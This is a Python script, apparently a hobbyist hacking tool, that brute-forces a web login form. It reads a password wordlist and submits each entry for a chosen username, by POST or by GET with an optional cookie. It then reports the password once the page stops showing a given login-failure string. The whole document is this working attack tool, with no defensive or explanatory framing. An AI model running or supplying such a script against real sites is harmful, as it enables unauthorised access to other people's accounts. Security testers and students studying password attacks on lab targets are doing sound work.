import requests

url=input('[+]Enter page URL: ')
username=input('[+]Enter username of the account to Bruteforce: ')
password_file=input('[+]Enter password file to use: ')
login_failed_string=input('[+] Enter string that occurs when login fails: ')
cookie_value=input('[+] Enter cookie value(optional)')

def cracking(username,url):
	for password in passwords:
		password=password.strip()
		print('Trying: '+password)
		data={'username':username, 'password':password, 'Login':'submit'}

		if cookie_value !='':
			response=requests.get(url,params={'username':username, 'password':password, 'Login':'Login'}, cookies={'Cookie': cookie_value})
		else:
			response=requests.post(url, data=data)
		if login_failed_string in response.content.decode():
			pass
		else:
			print('[+] Found username==>'+username)
			print('[+] Found password==>'+password)
			exit()


with open(password_file, 'r') as passwords:
	cracking(username,url)


print('[!!]Password not in list ')
